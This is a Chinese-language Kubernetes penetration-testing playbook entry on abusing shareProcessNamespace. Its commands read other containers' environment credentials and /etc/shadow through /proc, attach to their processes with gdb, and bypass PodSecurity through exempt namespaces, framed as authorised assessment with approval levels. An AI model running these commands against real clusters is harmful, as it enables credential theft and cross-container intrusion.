---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-1.11]
mapped_compliance_families: [Pod安全]
---

# shareprocessns-abuse — shareProcessNamespace 进程命名空间逃逸

Pod 配置 `shareProcessNamespace: true`，同一 Pod 内所有容器共享 PID 命名空间，攻击者可查看、信号干扰甚至 ptrace 注入其他容器的进程，实现跨容器进程访问与凭证窃取。

---

## 1. 前置条件

- Pod 配置 `spec.shareProcessNamespace: true`
- 同一 Pod 存在多个容器，且其中含承载敏感进程的容器
- 攻击者对某容器有 exec 权限或其镜像被劫持

检查命令：
```bash
# [L0] 宿主机观察：检查 Pod 是否共享进程命名空间
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.shareProcessNamespace}'
# 期望输出: true

# [L1] 容器内观察：确认可看到其他容器进程
kubectl exec -n <ns> <pod-name> -c <container> -- ps aux | wc -l
# 期望输出: 进程数远超单一容器应有的数量
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：确认 shareProcessNamespace 配置
kubectl get pod <pod-name> -n <ns> -o yaml | grep -i shareProcessNamespace
# 期望输出: shareProcessNamespace: true

# [L1] 容器内观察：列出所有容器进程
kubectl exec -n <ns> <pod-name> -c <container> -- ps aux
# 期望输出: 可见其他容器的进程（不同 /proc/<pid>/root）

# [L1] 容器内观察：确认 /proc 下可见其他容器文件系统
kubectl exec -n <ns> <pod-name> -c <container> -- ls /proc/*/root 2>/dev/null | head
# 期望输出: 多个不同 root（对应不同容器文件系统）
```

## 3. 攻击验证

```bash
# [L1] 容器内攻击验证：访问其他容器的进程环境变量读取凭证
kubectl exec -n <ns> <pod-name> -c <container> -- cat /proc/<victim-pid>/environ
# 期望输出: 含 TOKEN/SECRET 等环境变量凭证

# [L2] 容器内攻击验证：通过 /proc/<pid>/root 访问其他容器文件系统
kubectl exec -n <ns> <pod-name> -c <container> -- cat /proc/<victim-pid>/root/etc/shadow
# 期望输出: 其他容器的 /etc/shadow 内容

# [L2] 容器内攻击验证：通过 ptrace 注入其他容器进程
kubectl exec -n <ns> <pod-name> -c <container> -- gdb -p <victim-pid>
# 期望输出: 成功 attach（证明可达性）
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：普通 Pod（shareProcessNamespace=false）只能看到自身进程
kubectl exec -n <other-ns> <normal-pod> -- ps aux
# 期望输出: 仅本容器进程（PID 1 及子进程）

# [L0] 攻击后环境对比：shareProcessNamespace Pod 可见所有容器进程
kubectl exec -n <ns> <pod-name> -c <container> -- ps aux
# 期望输出: 多个容器进程列表 → 证明进程命名空间共享
```

差分结论：普通 Pod 内 `ps` 仅显示自身进程，shareProcessNamespace Pod 可见全部容器进程并访问其环境与文件系统，证明进程命名空间逃逸成功。

## 5. 绕过策略

```bash
# [L0] 检查 PodSecurity 是否限制 shareProcessNamespace
kubectl get namespace <ns> -o jsonpath='{.metadata.labels}'
# 若含 pod-security.kubernetes.io/enforce=restricted → shareProcessNamespace 被禁止

# 绕过方式：
# - [L1] 若共享 PID 但 Seccomp 限制 ptrace，仍可读 /proc/<pid>/environ 与 /root
# - [L2] 若 PodSecurity 限制但命名空间豁免，使用豁免命名空间部署
# - [L1] 若 ptrace 被阻断，通过 /proc/<pid>/cwd 与 /proc/<pid>/root 软链接访问文件
```

## 6. 证伪条件

```bash
# [L0] Pod 未共享进程命名空间
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.shareProcessNamespace}'
# 输出: false 或空 → 证伪

# [L1] 容器内仅可见自身进程
kubectl exec -n <ns> <pod-name> -c <container> -- ps aux
# 输出: 仅 PID 1 及子进程 → 证伪

# [L1] 无法访问其他容器的 /proc/<pid>/root
kubectl exec -n <ns> <pod-name> -c <container> -- ls /proc/2/root 2>&1
# 输出: No such file or directory 或仅自身容器 → 证伪
```

## 7. 审批级别

- **L2** 容器内攻击验证（ptrace 注入或读取其他容器凭证）→ **Level 4**（影响其他容器，需人工确认）
- **L1** 容器内探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Credential Access / Execution
- **Technique ID**: T1611
- **Technique Name**: Escape to Host
- **描述**: 攻击者通过 `shareProcessNamespace: true` 配置的 Pod 共享 PID 命名空间，访问同 Pod 内其他容器的进程、环境变量与文件系统，实现跨容器凭证窃取与进程注入。